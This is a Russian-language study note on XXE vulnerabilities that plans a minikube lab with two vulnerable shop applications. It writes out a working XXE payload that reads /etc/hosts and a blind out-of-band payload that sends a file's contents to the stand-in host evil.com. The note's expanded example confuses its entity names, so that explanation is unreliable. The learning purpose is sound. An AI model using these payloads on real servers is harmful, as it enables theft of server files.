Изучил суть XXE уязвимости. Суть заключается в небезопасном парсинге XML-парсером внешних сущностей в XML файле.
Пример на котором я понял суть атаки:
Сценарий:
 - Пользователь отпрпвляет подобный XML файл:

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Product [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<Product>
  <Name>&xxe;</Name>
</Product>

 - Сервер, заранее настроенный на парсинг чисел из XML, выводит содержимое файла /etc/hosts, и только потом заявляет об ошибке.
Это говорит о том, что сервер не блокирует внешние сущности и уязвим к XXE атаке.
Этот сценарий, когда результат обработки XML возвращается напрямую пользователю, является очень простым и опасным, 
поэтому мне показался слишком простым, поэтому я хочу реализовать случай, когда сервер не возвращает результат напрямую пользователю.
Данный сценарий реализуем, если в XML использованы параметризованные сущности:
 <!ENTITY % testEntity SYSTEM "https://evil.com/xxe_endpoint">
XML:
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ELEMENT test ANY>
    <!ENTITY % testEntity SYSTEM "https://evil.com/xxe_endpoint">
    %testEntity;
    %param;
    %query;
  ]>
А на внешнем сервере передается подобное содержимое:
 <!ENTITY % file SYSTEM "file:///path/to/file">
 <!ENTITY % param "<!ENTITY &#x25; query SYSTEM 'http://evil.com/xxe_endpoint?data=%file;'>">
Тогда test entity превратит XML файл в следующий вид:
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ELEMENT test ANY>
    <!ENTITY % testEntity SYSTEM "https://evil.com/xxe_endpoint">
    <!ENTITY % get SYSTEM "file:///path/to/file">
    <!ENTITY % file "<!ENTITY &#x25; query SYSTEM 'http://evil.com/xxe_endpoint?data=%file;'>">
    <!ENTITY % query SYSTEM 'http://evil.com/xxe_endpoint?data=%file;'>
  %param;
  %query;
  ]>
Здесь сервер за счет testEntity сделает запрос к evil.com, который создаст запрос к path/to/file с помощью file,
а сущность query создаст сетевой запрос на evil.com, который передаст path/to/file.

Для экплуатации данного сценария я хочу сделать Kubernetes кластер на minikube с 2мя приложениями
 - Одно будет возвращать ответ на XML пользователью, второе нет.
Приложение - виртуальный магазин, с возможностью регистрации пользователя по логину и паролю.
Данные о заказах, товарах и ID пользователей будут храниться в БД под Volume.
Данные о логинах, паролях и балансе будет храниться в БД под Secret.

Для реализации XXE атаки мне возможно потребуется сервер для обработки XML запросов условным злоумышленником.
